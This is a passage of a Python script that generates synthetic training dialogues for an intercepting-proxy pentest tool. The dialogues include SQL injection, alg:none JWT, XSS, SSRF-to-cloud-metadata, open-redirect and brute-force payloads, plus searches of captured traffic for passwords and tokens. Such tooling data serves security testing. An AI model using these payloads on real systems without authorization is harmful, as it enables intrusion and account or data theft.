                "headers": "content-type: application/json\r\n",
                "http_version": "HTTP/2.0",
                "status": 200,
                "timing_ms": 29,
            },
            "scheme": "https",
            "sni": "api.shopwave.io",
            "workspace_id": 1,
        },
        "error": None,
    }
    out.append(
        cli_example(
            tags=["req", "show", "https", "interpret"],
            turns=[
                ("user", "Show me the decrypted request and response for flow 41."),
                (
                    "assistant",
                    "```\nburpwn --json req show 41\n```\n\nBecause the traffic was MITM'd, "
                    "the HTTPS body is decrypted. You get the decoded request/response with "
                    "separate `headers` and `body` (plus `client_addr`, `exec_id`, timing):"
                    "\n\n```json\n" + json.dumps(show_detail, sort_keys=True) + "\n```\n\n"
                    "Here `/v1/me` leaks the numeric user id `1001` — a good IDOR candidate.",
                ),
            ],
        )
    )
    out.append(
        cli_example(
            tags=["req", "show", "raw"],
            turns=[
                ("user", "I need the byte-exact request and response for flow 41 to craft a PoC."),
                (
                    "assistant",
                    "Use `--raw` for the verbatim wire bytes instead of the parsed "
                    "summary:\n\n```\nburpwn req show 41 --raw\n```\n\nThis prints the literal "
                    "request head + body, a blank line, then the literal response head + "
                    "body — ideal to paste into a report or feed another tool.",
                ),
            ],
        )
    )
    for q, ids in [("password", [31, 18, 9]), ("authorization OR bearer", [41, 37]),
                   ("flag{", [88]), ("api_key", [55, 23])]:
        env = {"ok": True, "data": {"flow_ids": ids}, "error": None}
        out.append(
            cli_example(
                tags=["req", "search", "interpret"],
                turns=[
                    (
                        "user",
                        f"Find any captured flow whose body mentions '{q}'.",
                    ),
                    (
                        "assistant",
                        "Full-text (FTS5) search runs over request/response bodies:\n\n"
                        f'```\nburpwn --json req search "{q}"\n```\n\nIt returns matching '
                        f"flow ids, newest-first:\n\n```json\n{json.dumps(env, sort_keys=True)}"
                        "\n```\n\nThen `burpwn req show <id> --raw` on each to read the match "
                        "in context.",
                    ),
                ],
            )
        )
    return out


def fam_replay() -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []
    replay_env = (
        '{"ok":true,"data":{"response":"HTTP/1.1 200 OK\\r\\n'
        'content-type: application/json\\r\\n\\r\\n{\\"id\\":1002,\\"role\\":\\"user\\"}"},'
        '"error":null}'
    )
    out.append(
        cli_example(
            tags=["req", "replay", "idor", "bola"],
            turns=[
                (
                    "user",
                    "Flow 22 is `GET /api/users/1001/profile` with my own token. Test for "
                    "IDOR/BOLA by hitting user 1002.",
                ),
                (
                    "assistant",
                    "`req replay` edits headers/body/method but not the URL path, and the id "
                    "is in the path here. Two options:\n\n"
                    "1. Copy the raw request, swap the id, and re-issue it:\n```\n"
                    "burpwn req show 22 --raw   # copy it, change 1001 -> 1002\n"
                    'burpwn exec -- curl -s -H "Authorization: Bearer <token>" '
                    "https://api.shopwave.io/api/users/1002/profile\n```\n"
                    "2. If the id were a header/body field you'd use "
                    "`burpwn req replay 22 --set-header ...`.\n\nCompare the new response to "
                    "the original 200 — same profile data for another user = IDOR.",
                ),
            ],
        )
    )
    out.append(
        cli_example(
            tags=["req", "replay", "authz"],
            turns=[
                ("user", "Re-send flow 22 but strip the Authorization header to test missing authz."),
                (
                    "assistant",
                    "Override the header to empty and replay:\n\n```\n"
                    'burpwn --json req replay 22 --set-header "Authorization: "\n```\n\n'
                    f"The envelope echoes the live response as a string:\n\n```json\n{replay_env}"
                    "\n```\n\nIf the endpoint still returns `200` with data, it's missing "
                    "authentication; a `401`/`403` is the secure behaviour. `--set-header` "
                    "takes `Name: value` or `Name=value` and is repeatable. Note the replay "
                    "envelope is just `{response: \"<raw HTTP>\"}` — there is no separate "
                    "`status` field, so parse the status line of the string.",
                ),
            ],
        )
    )
    out.append(
        cli_example(
            tags=["req", "replay", "method", "body"],
            turns=[
                ("user", "Replay flow 30 as a POST with a tampered JSON body from payload.json."),
                (
                    "assistant",
                    "Override the method and read the body from a file with `@`:\n\n```\n"
                    "burpwn req replay 30 --method POST --set-body @payload.json "
                    '--set-header "Content-Type: application/json"\n```\n\n`--set-body` '
                    "accepts a literal string or `@file`; `--method` overrides the verb. The "
                    "original flow is untouched — replay always issues a fresh request and "
                    "returns its response string.",
                ),
            ],
        )
    )
    # JWT / SQLi / open-redirect replays
    out.append(
        cli_example(
            tags=["req", "replay", "jwt"],
            turns=[
                (
                    "user",
                    "Flow 44 carries a JWT in the Authorization header. Replay it with an "
                    "alg:none forged token to test verification.",
                ),
                (
                    "assistant",
                    "Swap the header value for your crafted token and replay:\n\n```\n"
                    'burpwn req replay 44 --set-header '
                    '"Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9."\n```\n\n'
                    "A `200` with admin data means the server trusts an unsigned `alg:none` "
                    "token — a critical JWT verification flaw. A `401` is correct behaviour.",
                ),
            ],
        )
    )
    out.append(
        cli_example(
            tags=["req", "replay", "sqli"],
            turns=[
                (
                    "user",
                    "Flow 17 is a search POST. Replay it with a SQLi probe in the body to see "
                    "if the response changes.",
                ),
                (
                    "assistant",
                    "Replace the body with the payload and replay:\n\n```\n"
                    "burpwn req replay 17 --set-body \"q=test' OR '1'='1\"\n```\n\nDiff the "
                    "returned response string against the original: extra rows, a SQL error, "
                    "or a timing change all suggest injection. Then drive `sqlmap` under "
                    "`burpwn exec` on the same endpoint to confirm and exploit.",
                ),
            ],
        )
    )
    return out


def fam_intercept_cli() -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []
    out.append(
        cli_example(
            tags=["intercept", "workflow", "tamper", "multi-step"],
            turns=[
                (
                    "user",
                    "I want to manually tamper the next request the app sends — add an admin "
                    "header before it goes out.",
                ),
                (
                    "assistant",
                    "Enable interception, then long-poll for the next parked request:\n\n```\n"
                    "burpwn intercept enable\nburpwn --json intercept await --timeout 60\n```\n\n"
                    "`enable` returns `{\"ok\":true,\"data\":{\"type\":\"Ack\"},\"error\":null}`. "
                    "`await` parks the next request and returns it.",
                ),
                (
                    "user",
                    'It returned `{"ok":true,"data":{"type":"Pending","item":{"id":1,'
                    '"kind":"request","host":"acme.com","method":"POST","path":"/cart/checkout"}},'
                    '"error":null}`. Add the header and let it go.',
                ),
                (
                    "assistant",
                    "Forward that id with the edit:\n\n```\n"
                    'burpwn intercept forward 1 --set-header "X-Admin: true"\n```\n\nA '
                    'successful release returns `{"ok":true,"data":{"type":"Resolved",'
                    '"found":true},"error":null}`. Run `burpwn intercept disable` when '
                    "you're done.",
                ),
            ],
        )
    )
    out.append(
        cli_example(
            tags=["intercept", "drop"],
            turns=[
                (
                    "user",
                    "A telemetry beacon got parked as intercept id 3 — I don't want it sent. "
                    "Kill it.",
                ),
                (
                    "assistant",
                    "Drop the parked intercept so it's never forwarded:\n\n```\n"
                    "burpwn intercept drop 3\n```\n\nReturns "
                    '`{"ok":true,"data":{"type":"Resolved","found":true},"error":null}`. If '
                    "`found` is `false`, that id was already resolved or never existed.",
                ),
            ],
        )
    )
    out.append(
        cli_example(
            tags=["intercept", "list"],
            turns=[
                ("user", "What requests are currently held by the interceptor?"),
                (
                    "assistant",
                    "```\nburpwn --json intercept list\n```\n\nReturns the parked items:\n\n"
                    '```json\n{"ok":true,"data":{"type":"Intercepts","items":[]},'
                    '"error":null}\n```\n\nAn empty `items` array means nothing is parked (or '
                    "interception is disabled).",
                ),
            ],
        )
    )
    out.append(
        cli_example(
            tags=["intercept", "disable"],
            turns=[
                ("user", "I'm done tampering — stop holding requests."),
                (
                    "assistant",
                    "```\nburpwn intercept disable\n```\n\nReturns "
                    '`{"ok":true,"data":{"type":"Ack"},"error":null}`. New requests now flow '
                    "straight through (still captured, just not parked). Forward or drop any "
                    "already-parked items first.",
                ),
            ],
        )
    )
    out.append(
        cli_example(
            tags=["intercept", "forward", "body"],
            turns=[
                (
                    "user",
                    "Parked intercept 2 is a checkout POST. Forward it but change the body to "
                    "set qty=99 and the method stays POST.",
                ),
                (
                    "assistant",
                    "Forward with a body edit (CLI also supports `--method` if you needed to "
                    "change the verb):\n\n```\nburpwn intercept forward 2 --set-body "
                    "'{\"item\":\"sku-9\",\"qty\":99}' --set-header "
                    '"Content-Type: application/json"\n```\n\nReturns '
                    '`{"ok":true,"data":{"type":"Resolved","found":true},"error":null}`; the '
                    "tampered request goes to the server and is captured like any other.",
                ),
            ],
        )
    )
    return out


def fam_match_replace() -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []
    out.append(
        cli_example(
            tags=["match-replace", "auth-inject"],
            turns=[
                ("user", "Inject a fixed bearer token into every request to all hosts."),
                (
                    "assistant",
                    "Add a request-side rule on the `header` kind with an empty scope (= all "
                    "hosts):\n\n```\nburpwn match-replace add \"\" header Authorization "
                    '"Bearer eyJhbGciOi..."\n```\n\nReturns the new rule id '
                    '`{"ok":true,"data":{"id":1},"error":null}`. Args are `<SCOPE> <KIND> '
                    "<PATTERN> <REPLACEMENT>`; `--on request` is the default (use "
                    "`--on response` to rewrite responses). Every subsequent `exec` request "
                    "now carries the header.",
                ),
            ],
        )
    )
    out.append(
        cli_example(
            tags=["match-replace", "list", "interpret"],
            turns=[
                ("user", "What match/replace rules are active?"),
                (
                    "assistant",
                    "```\nburpwn --json match-replace list\n```\n\n`data` is a bare array; "
                    "each rule shows id, scope, kind, pattern, replacement, direction and "
                    "enabled flag:\n\n```json\n"
                    '{"ok":true,"data":[{"enabled":true,"id":1,"match_kind":"header",'
                    '"on_request":true,"pattern":"Authorization","replacement":"Bearer ...",'
                    '"scope":""}],"error":null}\n```',
                ),
            ],
        )
    )
    out.append(
        cli_example(
            tags=["match-replace", "scope", "response"],
            turns=[
                ("user", "On only *.acme.com responses, rewrite the string PRODUCTION to STAGING."),
                (
                    "assistant",
                    "Scope it to the host glob, match on the `body` kind, apply on responses:"
                    "\n\n```\nburpwn match-replace add \"*.acme.com\" body PRODUCTION STAGING "
                    "--on response\n```\n\n`<SCOPE>` is a host glob (empty = all), `<KIND>` is "
                    "one of `header|body|url|host`, and `--on response` flips it from the "
                    "default request direction.",
                ),
            ],
        )
    )
    out.append(
        cli_example(
            tags=["match-replace", "url", "host"],
            turns=[
                (
                    "user",
                    "Rewrite the Host header so requests to www.acme.com hit the staging "
                    "backend instead.",
                ),
                (
                    "assistant",
                    "Use the `host` kind on requests:\n\n```\nburpwn match-replace add "
                    '"www.acme.com" host www.acme.com staging.acme.com\n```\n\nThe `host` and '
                    "`url` kinds rewrite the request line/Host; `header` and `body` rewrite "
                    "those parts. Confirm with `burpwn match-replace list`.",
                ),
            ],
        )
    )
    return out


def fam_tag_note_workspace() -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []
    for fid, name in [(14, "sqli"), (41, "idor"), (22, "bola"), (44, "jwt"),
                      (17, "xss"), (9, "ssrf")]:
        out.append(
            cli_example(
                tags=["tag", "triage", name],
                turns=[
                    (
                        "user",
                        f"Flag flow {fid} as a candidate {name.upper()} so I can find it later.",
                    ),
                    (
                        "assistant",
                        f"```\nburpwn tag add {fid} {name}\n```\n\nArgs are `<FLOW_ID> "
                        f"<NAME>`; the tag is created if it doesn't exist. Returns "
                        f'`{{"ok":true,"data":{{"flow_id":{fid},"name":"{name}",'
                        f'"tag_id":2}},"error":null}}`.',
                    ),
                ],
            )
        )
    out.append(
        cli_example(
            tags=["note", "triage"],
            turns=[
                ("user", "Add a note to flow 14 reminding me the id param looked injectable."),
                (
                    "assistant",
                    '```\nburpwn note add 14 "id param reflects unescaped in SQL error"\n```\n\n'
                    'Args are `<FLOW_ID> <TEXT>`. Returns `{"ok":true,"data":{"flow_id":14,'
                    '"note_id":1},"error":null}`.',
                ),
            ],
        )
    )
    out.append(
        cli_example(
            tags=["workspace", "organise"],
            turns=[
                ("user", "Group this target's flows under a workspace called 'login-flow'."),
                (
                    "assistant",
                    "Create the workspace, then attribute traffic by passing its **id** to "
                    "`exec`/`req` (the `workspace use` command is informational only):\n\n```\n"
                    "burpwn workspace new login-flow\nburpwn exec --workspace 3 -- curl -s "
                    "https://acme.com/login\nburpwn req list --workspace 3\n```\n\n"
                    '`workspace new` returns `{"ok":true,"data":{"id":3,"name":"login-flow"},'
                    '"error":null}`; `workspace use <name>` merely records the choice in '
                    "config and does not auto-scope, so always pass `--workspace <id>`.",
                ),
            ],
        )
    )
    return out


def fam_export() -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []
    out.append(
        cli_example(
            tags=["export", "har"],
            turns=[
                ("user", "Export all captured traffic to a HAR file for the report."),
                (
                    "assistant",
                    "```\nburpwn export har -o session.har\n```\n\nWrites an HAR 1.2 document "
                    "(`{\"log\":{\"version\":\"1.2\",\"creator\":{\"name\":\"burpwn\",...},"
                    "\"entries\":[...]}}`); without `-o` it prints to stdout. Scope it with "
                    "`--workspace <id>` to export just one bucket. HAR preserves the "
                    "decrypted bodies a pcap of MITM'd TLS would not.",
                ),
            ],
        )
    )
    out.append(
        cli_example(
            tags=["export", "har", "workspace"],
            turns=[
                ("user", "Export just the login-flow workspace (id 3) as HAR to disk."),
                (
                    "assistant",
                    "```\nburpwn export har --workspace 3 -o login-flow.har\n```\n\nOnly flows "
                    "attributed to workspace 3 are included in the `entries` array.",
                ),
            ],
        )
    )
    return out


def fam_negatives() -> list[dict[str, Any]]:
    """Errors / recovery / disambiguation — verified against the binary."""
    out: list[dict[str, Any]] = []
    out.append(
        cli_example(
            tags=["negative", "export", "pcap"],
            turns=[
                ("user", "Export the session as a pcap so I can open it in Wireshark."),
                (
                    "assistant",
                    "pcap export is **not implemented** — it errors clearly:\n\n```json\n"
                    '{"ok":false,"data":null,"error":"pcap export is not yet implemented '
                    '(use `export har`)"}\n```\n\nUse HAR: `burpwn export har -o session.har`. '
                    "Most HTTP tooling imports HAR, and it keeps the decrypted bodies a pcap "
                    "of MITM'd TLS would not.",
                ),
            ],
        )
    )
    out.append(
        cli_example(
            tags=["negative", "match-replace", "rm"],
            turns=[
                ("user", "Remove match/replace rule 1."),
                (
                    "assistant",
                    "Heads up: although `match-replace rm`, `enable` and `disable` exist as "
                    "subcommands, they are **not yet supported at runtime** — the store "
                    "writer exposes only add + list. Running it errors:\n\n```\nburpwn: "
                    "match-replace rm/enable/disable are not yet supported: the store writer "
                    "exposes only add + list for rules\n```\n\nWorkaround: rules apply only "
                    "while the session's proxy daemon is running, so to clear a rule today "
                    "you stop/restart the session's daemon (or start a fresh session) and "
                    "re-add the rules you still want with `match-replace add`.",
                ),
            ],
        )
    )
    out.append(
        cli_example(
            tags=["negative", "dns"],
            turns=[
                ("user", "Does name resolution work inside the sandbox, or do I need raw IPs?"),
                (
                    "assistant",
                    "DNS works — hostnames resolve normally. burpwn runs a resolver inside "
                    "the namespace and **captures the lookups**: they appear as `dns` "
                    "protocol flows with `method:\"QUERY\"` and paths like `acme.com./A` / "
                    "`acme.com./AAAA`. So `burpwn exec -- curl https://acme.com` is fine; "
                    "review resolution with `burpwn req list --protocol dns`.",
                ),
            ],
        )
    )
    out.append(
        cli_example(
            tags=["negative", "tls-passthru", "pinning"],
            turns=[
                ("user", "One host's requests show up as 'tls-passthru' with no decrypted body. Why?"),
                (
                    "assistant",
                    "That host is **certificate-pinned** (or otherwise rejected burpwn's CA), "
                    "so burpwn could not MITM it and let the TLS pass through untouched — "
                    "hence the `tls-passthru` protocol and no plaintext. You still get the "
                    "metadata (SNI, dst ip/port, timing) via "
                    "`burpwn req list --protocol tls-passthru`, but not the body. burpwn "
                    "deliberately doesn't break pinned connections.",
                ),
            ],
        )
    )
    out.append(
        cli_example(
            tags=["negative", "llm-traffic"],
            turns=[
                (
                    "user",
                    "If I run my AI agent under `burpwn exec`, won't burpwn capture the "
                    "agent's own LLM API calls and pollute the flows?",
                ),
                (
                    "assistant",
                    "No. burpwn is designed so the **agent's own LLM traffic stays outside "
                    "the sandbox** and is never captured — only the commands you launch via "
                    "`burpwn exec -- <cmd>` (the actual pentest tooling) have their network "
                    "forced through the proxy. So `req list` shows the target's traffic, not "
                    "your model API calls.",
                ),
            ],
        )
    )
    out.append(
        cli_example(
            tags=["negative", "req-show", "missing"],
            turns=[
                ("user", "I ran `burpwn req show 999` and it said `burpwn: no such flow: 999`. Bug?"),
                (
                    "assistant",
                    "Not a bug — flow 999 doesn't exist in the active session's store. List "
                    "what's actually captured with `burpwn --json req list` and use a real "
                    "`id`. Also confirm the session (`burpwn session list`); flows are "
                    "per-session, so an id from another session won't resolve here.",
                ),
            ],
        )
    )
    out.append(
        cli_example(
            tags=["negative", "tag", "foreign-key"],
            turns=[
                (
                    "user",
                    "`burpwn tag add 500 sqli` failed with a sqlite FOREIGN KEY constraint "
                    "error. What gives?",
                ),
                (
                    "assistant",
                    "Tags and notes reference an existing flow by id; flow 500 isn't in the "
                    "store, so the foreign-key check fails. Find a real id first with "
                    "`burpwn --json req list` (look at the `id` field) and tag that. The same "
                    "applies to `burpwn note add <flow_id> <text>`.",
                ),
            ],
        )
    )
    out.append(
        cli_example(
            tags=["negative", "intercept", "no-daemon"],
            turns=[
                (
                    "user",
                    "`burpwn intercept enable` says no proxy daemon is answering for the "
                    "session. How do I start it?",
                ),
                (
                    "assistant",
                    "The interception commands drive a per-session proxy daemon that is "
                    "spawned lazily by `exec`. Kick it off by running any command through the "
                    "sandbox first:\n\n```\nburpwn exec -- curl -s https://acme.com/\n```\n\n"
                    "That launches the daemon for the active session; then "
                    "`burpwn intercept enable` / `await` will connect.",
                ),
            ],
        )
    )
    out.append(
        cli_example(
            tags=["negative", "intercept", "await-timeout"],
            turns=[
                (
                    "user",
                    "`burpwn --json intercept await --timeout 5` returned "
                    '`{"ok":true,"data":{"type":"Pending","item":null},"error":null}`. Did it '
                    "fail?",
                ),
                (
                    "assistant",
                    "No — `item:null` means nothing parked within the 5-second window (the "
                    "long-poll timed out). Normal when the app is idle. Make sure "
                    "interception is enabled (`burpwn intercept enable`), trigger traffic, "
                    "and `await` again; raise `--timeout` (default 30) to block longer.",
                ),
            ],
        )
    )
    return out


def fam_meta() -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []
    out.append(
        cli_example(
            tags=["meta", "mcp-vs-cli"],
            turns=[
                ("user", "Should I drive burpwn via the shell or over MCP from my agent?"),
                (
                    "assistant",
                    "Both expose the same engine. Use the **CLI** (`burpwn <cmd> --json`) for "
                    "ad-hoc shell work, scripting and piping. Use the **MCP server** "
                    "(`burpwn mcp`, stdio) when an LLM agent should call burpwn as tools — it "
                    "exposes 19 tools (`req_list`, `req_show`, `req_search`, `exec`, "
                    "`intercept_*`, `match_replace_*`, `tag_add`, `note_add`, "
                    "`workspace_*`, `session_*`) with typed JSON arguments. One gotcha: the "
                    "MCP tool *results* are NOT wrapped in `{ok,data,error}` and use "
                    "different keys (e.g. `req_list` returns `{flows,count}`, intercept tools "
                    "return `{ok:true}`/`{pending:...}`/`{found:...}`), so don't expect the "
                    "CLI envelope shapes over MCP.",
                ),
            ],
        )
    )
    return out


# --------------------------------------------------------------------------- #
# Multi-turn CLI workflows (2–8 turns) — reasoning-then-act.
# --------------------------------------------------------------------------- #


def fam_cli_workflows() -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []

    # Recon -> search -> show -> tag (juice-shop XSS hunt)
    out.append(
        cli_example(
            tags=["workflow", "multi-step", "xss", "juiceshop"],
            turns=[
                ("user", "Help me hunt reflected XSS on juice-shop's search."),
                (
                    "assistant",
                    "Plan: fetch the search endpoint with a probe value, find the flow that "
                    "reflects it, inspect the response, and flag it.\n\nStep 1 — fire a "
                    "probe through the sandbox:\n```\nburpwn exec -- curl -s "
                    "'https://juice-shop.local/rest/products/search?q=xsstest123'\n```",
                ),
                ("user", "Done. Now find which flow holds the reflection."),
                (
                    "assistant",
                    "Full-text search the bodies for the probe:\n```\n"
                    "burpwn --json req search xsstest123\n```\n→ "
                    '`{"ok":true,"data":{"flow_ids":[14]},"error":null}`. Read flow 14 to '
                    "see whether the value is HTML-encoded or reflected raw:\n```\n"
                    "burpwn req show 14 --raw\n```",
                ),
                ("user", "It's reflected unencoded inside a <script> block."),
                (
                    "assistant",
                    "That's reflected XSS. Flag and annotate it for the report:\n```\n"
                    "burpwn tag add 14 xss\nburpwn note add 14 \"q param reflected "
                    "unencoded into <script>; confirmed reflected XSS\"\n```\nThen craft a "
                    "PoC payload (e.g. `q=<script>alert(document.domain)</script>`) and "
                    "replay flow 14 with `--set-body`/a fresh `exec` curl to demonstrate.",
                ),
            ],
        )
    )

    # IDOR end-to-end on REST API
    out.append(
        cli_example(
            tags=["workflow", "multi-step", "idor", "bola", "restapi"],
            turns=[
                ("user", "Walk me through testing the shopwave API for IDOR on /v1/orders."),
                (
                    "assistant",
                    "Plan: capture an authenticated request, read the response to learn the "
                    "id scheme, then replay against another id.\n\nStep 1:\n```\n"
                    "burpwn exec -- curl -s -H \"Authorization: Bearer $TOKEN\" "
                    "https://api.shopwave.io/v1/orders/5001\n```",
                ),
                ("user", "Captured as flow 41. What next?"),
                (
                    "assistant",
                    "Inspect it to confirm it returns *your* order and note the id scheme:\n"
                    "```\nburpwn --json req show 41\n```\nThen replay against a neighbouring "
                    "id — the id is in the path, so re-issue with curl rather than "
                    "`req replay` (which can't edit the path):\n```\n"
                    "burpwn exec -- curl -s -H \"Authorization: Bearer $TOKEN\" "
                    "https://api.shopwave.io/v1/orders/5002\n```",
                ),
                ("user", "5002 returned someone else's order with 200."),
                (
                    "assistant",
                    "That's a confirmed IDOR/BOLA: your token reads another tenant's order. "
                    "Record it:\n```\nburpwn tag add 41 idor\nburpwn note add 41 \"GET "
                    "/v1/orders/{id} returns other users' orders with own token — BOLA\"\n"
                    "```\nExport the evidence for the report with "
                    "`burpwn export har -o idor-evidence.har`.",
                ),
            ],
        )
    )

    # SSRF on internal host
    out.append(
        cli_example(
            tags=["workflow", "multi-step", "ssrf", "internal"],
            turns=[
                ("user", "The intranet app has a URL-fetch feature. Test it for SSRF."),
                (
                    "assistant",
                    "Plan: submit a URL pointing at an internal/metadata target and see if "
                    "the server fetches it.\n\nStep 1 — send the SSRF probe through the "
                    "sandbox:\n```\nburpwn exec -- curl -s "
                    "'http://intranet.corp.lan:8080/fetch?url=http://169.254.169.254/latest/meta-data/'"
                    "\n```",
                ),
                ("user", "Captured. How do I confirm it actually reached the metadata endpoint?"),
                (
                    "assistant",
                    "Search the captured responses for tell-tale metadata content and read "
                    "the flow:\n```\nburpwn --json req search meta-data\nburpwn req show "
                    "<id> --raw\n```\nIf the response body contains the metadata listing, "
                    "the server fetched the internal URL on your behalf — SSRF. Tag it "
                    "`ssrf` and note the reachable internal target.",
                ),
            ],
        )
    )

    # Match-replace driven session-wide auth + ffuf
    out.append(
        cli_example(
            tags=["workflow", "multi-step", "match-replace", "ffuf"],
            turns=[
                (
                    "user",
                    "I want to fuzz authenticated endpoints. Set a session-wide bearer token "
                    "then fuzz.",
                ),
                (
                    "assistant",
                    "Plan: install a request match/replace rule to inject the token on every "
                    "request, then run ffuf — each probe inherits the header automatically.\n"
                    "\nStep 1 — add the rule:\n```\nburpwn match-replace add \"\" header "
                    'Authorization "Bearer eyJ..."\n```\n→ `{"ok":true,"data":{"id":1},'
                    '"error":null}`.',
                ),
                ("user", "Rule added. Now fuzz the API paths."),
                (
                    "assistant",
                    "Run ffuf under the sandbox; every request goes out with the injected "
                    "header:\n```\nburpwn exec --timeout 600 -- ffuf -u "
                    "https://api.shopwave.io/v1/FUZZ -w api-words.txt -mc 200,403\n```\n"
                    "Then triage authenticated hits: `burpwn req list --host "
                    "api.shopwave.io --status 200`.",
                ),
            ],
        )
    )

    # GraphQL introspection
    out.append(
        cli_example(
            tags=["workflow", "multi-step", "graphql"],
            turns=[
                ("user", "Check whether the GraphQL API allows introspection."),
                (
                    "assistant",
                    "Send an introspection query through the sandbox:\n```\nburpwn exec -- "
                    "curl -s https://gql.acme-corp.com/graphql -H "
                    "'Content-Type: application/json' -d "
                    "'{\"query\":\"{__schema{types{name}}}\"}'\n```\nThen inspect the "
                    "response:\n```\nburpwn --json req list --host gql.acme-corp.com "
                    "--method POST\nburpwn req show <id>\n```",
                ),
                ("user", "It returned the full __schema types list."),
                (
                    "assistant",
                    "Introspection is enabled and exposes the whole schema — useful for "
                    "mapping mutations/queries, and often a finding in production. Tag the "
                    "flow `graphql-introspection` and enumerate sensitive mutations next.",
                ),
            ],
        )
    )

    # open-redirect
    out.append(
        cli_example(
            tags=["workflow", "multi-step", "open-redirect"],
            turns=[
                ("user", "Test the login redirect param for an open redirect."),
                (
                    "assistant",
                    "Send a request with an external `next`/`redirect` value and watch the "
                    "Location header:\n```\nburpwn exec -- curl -s -o /dev/null -D - "
                    "'https://app.fintrack.dev/login?next=https://evil.example/'\n```\nThen "
                    "read the captured flow:\n```\nburpwn req show <id>\n```\nIf the response "
                    "is a 30x with `Location: https://evil.example/`, it's an open redirect. "
                    "Tag `open-redirect` and note the parameter.",
                ),
            ],
        )
    )

    # CSRF check
    out.append(
        cli_example(
            tags=["workflow", "multi-step", "csrf"],
            turns=[
                ("user", "Does the password-change endpoint have CSRF protection?"),
                (
                    "assistant",
                    "Replay the captured state-changing request without the anti-CSRF token "
                    "header and see if it still succeeds:\n```\nburpwn req replay 30 "
                    '--set-header "X-CSRF-Token: "\n```\nA `200` that still changes state '
                    "with the token stripped (and no SameSite cookie protection) indicates "
                    "missing CSRF protection. A `403` is the expected, secure behaviour.",
                ),
            ],
        )
    )

    # rate-limit
    out.append(
        cli_example(
            tags=["workflow", "multi-step", "rate-limit"],
            turns=[
                ("user", "Check if the login endpoint enforces rate limiting."),
                (
                    "assistant",
                    "Drive a quick burst through the sandbox and check the statuses:\n```\n"
                    "burpwn exec -- bash -c 'for i in $(seq 1 50); do curl -s -o /dev/null "
                    "-X POST https://app.fintrack.dev/login -d \"u=a&p=b$i\"; done'\n```\n"
                    "Then list the results:\n```\nburpwn req list --host app.fintrack.dev "
                    "--method POST --limit 60\n```\nIf you never see `429` (or a lockout) "
                    "across 50 attempts, the endpoint lacks rate limiting / brute-force "
                    "protection.",
                ),
            ],
        )
    )
    return out


# --------------------------------------------------------------------------- #
# MCP single-tool examples (grounded result shapes from handlers.rs).
# --------------------------------------------------------------------------- #


def fam_mcp_single() -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []

    out.append(
        mcp_example(
            tags=["mcp", "session_current"],
            user="Which burpwn session is active?",
            steps=[{
                "tool": "session_current", "args": {},
                "result": {"active": "acme", "db_exists": True},
                "final": "You're on the `acme` session and its capture database exists, so "
                         "it's ready to query.",
            }],
        )
    )
    out.append(
        mcp_example(
            tags=["mcp", "session_list"],
            user="What sessions are available?",
            steps=[{
                "tool": "session_list", "args": {},
                "result": {"active": "acme", "sessions": ["default", "acme", "shopwave"]},
                "final": "Three sessions exist — `default`, `acme`, `shopwave` — and `acme` "
                         "is active.",
            }],
        )
    )
    # req_list across targets/filters; MCP result is {flows, count}
    for t, args, rows in [
        (_t("restapi"), {"host": "api.shopwave.io", "method": "GET", "status": 200},
         [{"id": 41, "authority": "api.shopwave.io", "method": "GET", "path": "/v1/me",
           "status": 200, "protocol": "h2", "scheme": "https", "dst_port": 443}]),
        (_t("juiceshop"), {"host": "juice-shop.local", "status": 500},
         [{"id": 88, "authority": "juice-shop.local", "method": "POST",
           "path": "/rest/products/search", "status": 500, "protocol": "h2"}]),
        (_t("dvwa"), {"method": "POST"},
         [{"id": 12, "authority": "dvwa.local", "method": "POST", "path": "/login.php",
           "status": 302, "protocol": "h1"}]),
    ]:
        out.append(
            mcp_example(
                tags=["mcp", "req_list", "filter", t.key],
                user=f"List flows matching {json.dumps(args)} on {t.host}.",
                steps=[{
                    "tool": "req_list", "args": args,
                    "result": {"flows": rows, "count": len(rows)},
                    "final": f"`count` is {len(rows)}; e.g. flow {rows[0]['id']} "
                             f"`{rows[0]['method']} {rows[0]['path']}` → "
                             f"{rows[0]['status']}. Want me to `req_show` it for the decoded "
                             "request/response?",
                }],
            )
        )
    out.append(
        mcp_example(
            tags=["mcp", "req_show", "raw", "idor"],
            user="Show me the raw bytes of flow 41 so I can build a PoC.",
            steps=[{
                "tool": "req_show", "args": {"id": 41, "raw": True},
                "result": {
                    "id": 41, "protocol": "h2",
                    "request": {"method": "GET", "path": "/v1/me",
                                "headers": "authorization: Bearer ...\r\n", "body": ""},
                    "response": {"status": 200, "headers": "content-type: application/json\r\n",
                                 "body": '{"id":1001,"role":"user"}'},
                    "raw_request": "GET /v1/me HTTP/2\r\nauthorization: Bearer ...\r\n\r\n",
                    "raw_response": 'HTTP/2 200\r\ncontent-type: application/json\r\n\r\n'
                                    '{"id":1001,"role":"user"}',
                },
                "final": "Flow 41 is `GET /v1/me` with a bearer token; the JSON exposes "
                         '`{"id":1001,"role":"user"}`. The `raw_request`/`raw_response` '
                         "fields are byte-exact. Since the response leaks the numeric user "
                         "id, this is a strong IDOR candidate on `/v1/users/<id>`.",
            }],
        )
    )
    for q, ids in [("token", [41, 37, 12]), ("password", [31, 9]), ("flag{", [88])]:
        out.append(
            mcp_example(
                tags=["mcp", "req_search"],
                user=f"Search captured traffic for anything containing '{q}'.",
                steps=[{
                    "tool": "req_search", "args": {"query": q},
                    "result": {"flow_ids": ids},
                    "final": f"{len(ids)} flow(s) match '{q}': "
                             f"{', '.join(map(str, ids))} (newest first). I can `req_show` "
                             "any of them to read the match in context.",
                }],
            )
        )
    # exec via MCP
    out.append(
        mcp_example(
            tags=["mcp", "exec", "recon"],
            user="Curl the juice-shop homepage through the sandbox and tell me what got captured.",
            steps=[{
                "tool": "exec",
                "args": {"argv": ["curl", "-s", "-o", "/dev/null", "https://juice-shop.local/"]},
                "result": {"exit_code": 0, "captured_request_ids": [50, 51, 52],
                           "exec_id": "exec-4101-0-1781400000000000000"},
                "final": "Clean exit (`exit_code:0`); 3 flows captured: 50, 51, 52 (A/AAAA "
                         "DNS + the HTTPS GET). `req_show` the highest id (52) for the "
